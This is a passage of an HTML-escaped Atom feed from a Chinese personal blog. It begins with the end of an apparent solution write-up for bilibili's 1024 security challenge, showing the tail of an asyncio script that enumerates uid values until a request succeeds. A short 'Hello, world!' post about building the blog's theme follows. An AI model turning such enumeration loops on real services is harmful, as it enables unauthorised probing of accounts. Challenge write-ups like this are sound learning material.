                &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gather&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;tasks&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="n"&gt;tasks&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;clear&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;success&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;is_set&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
                &lt;span class="k"&gt;break&lt;/span&gt;
            &lt;span class="n"&gt;uid&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
        &lt;span class="k"&gt;await&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gather&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;tasks&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;


&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;'__main__'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;p&gt;稍微解释一下。第 32 行的 &lt;code&gt;@retry&lt;/code&gt; 是为了防止服务器不稳定导致脚本直接退出。&lt;code&gt;make_request&lt;/code&gt; 会在成功时调用 &lt;code&gt;success.set&lt;/code&gt;，告知 &lt;code&gt;main&lt;/code&gt; 不用再运行下去了。&lt;/p&gt;
&lt;/section&gt;
&lt;section id="id8"&gt;
&lt;h3&gt;剩下的题目&lt;/h3&gt;
&lt;p&gt;第六题的页面始终进不去，也 ping 不通。故障的话不至于持续这么久，看来这或许是正常现象🤔？之后如果我探究出个所以然的话也会补上解答过程。&lt;/p&gt;
&lt;hr/&gt;
&lt;dl class="m-footnote"&gt;
&lt;dt id="id9"&gt;1.&lt;/dt&gt;
&lt;dd&gt;&lt;span class="m-footnote"&gt;&lt;a href="#id4"&gt;^&lt;/a&gt;&lt;/span&gt; 其中第一处的 &lt;code&gt;&amp;lt;meta&amp;gt;&lt;/code&gt; 标签我后来发现每一题的页面中都存在🤣。&lt;/dd&gt;
&lt;/dl&gt;
&lt;/section&gt;
</content><category term="Notes"></category><category term="bilibili"></category><category term="B站"></category><category term="1024"></category><category term="程序员节"></category><category term="安全挑战赛"></category><category term="解答"></category><category term="答案"></category></entry><entry><title>Hello, world!</title><link href="https://shniubobo.xyz/article/hello-world.html" rel="alternate"></link><published>2020-10-01T00:00:00+08:00</published><updated>2020-10-08T00:00:00+08:00</updated><author><name>shniubobo</name></author><id>tag:shniubobo.xyz,2020-10-01:/article/hello-world.html</id><summary type="html">你好，世界！</summary><content type="html">&lt;p&gt;Hello, world!&lt;/p&gt;
&lt;p&gt;打算建个博客，目前只做了一些基本的配置，看上去很简陋，各种方面都还有许多需要完善之处：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;网站没有图标&lt;/li&gt;
&lt;li&gt;缺少指向源码以及我的 Github 页面的链接&lt;/li&gt;
&lt;li&gt;这个主题的标签和分类页面无法禁用，始终会在页面上显示相应链接&lt;/li&gt;
&lt;li&gt;……&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;始终没有找到一个满意的主题，打算以后自己写一个，顺便可以当做学习 &lt;span class="caps"&gt;HTML&lt;/span&gt; 和 &lt;span class="caps"&gt;CSS&lt;/span&gt; 时的练习吧。&lt;/p&gt;
&lt;p&gt;可能会在博客发各种东西，不局限于任何一个领域，主要还是看心情吧。&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;花了大半个国庆假期，终于把主题基本做好了。上张图对比下：&lt;/p&gt;
&lt;figure&gt;
&lt;img alt="主题前后对比" src="https://shniubobo.xyz/article/images/hello-world/1.jpg"/&gt;
&lt;figcaption&gt;上图为换主题前，下图为换主题后&lt;/figcaption&gt;
&lt;/figure&gt;
&lt;p&gt;说是基本做好是因为现在还有很多功能不支持，例如图片没有做 lazyload（这个可能需要自己写个插件自动生成缩略图并为 &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; 标签加上 &lt;code&gt;data-src&lt;/code&gt; 属性）、没有目录（这个应该有现成的插件可以用）等，同时还有一些地方看着有些不顺眼（例如下面的许可信息）。放假一结束就有好几个 &lt;span class="caps"&gt;DDL&lt;/span&gt;，所以打算先把 &lt;span class="caps"&gt;DDL&lt;/span&gt; 赶完了再来做剩下的主题。主题完善后还会考虑做一些小修改再开源（例如右边这几个社交图标不方便用在通用的主题里）。&lt;/p&gt;
&lt;p&gt;做主题的整个过程里踩了很多坑，也会在赶完 &lt;span class="caps"&gt;DDL&lt;/span&gt; 后写一篇文章讲一下。&lt;/p&gt;
</content><category term="Misc"></category></entry></feed>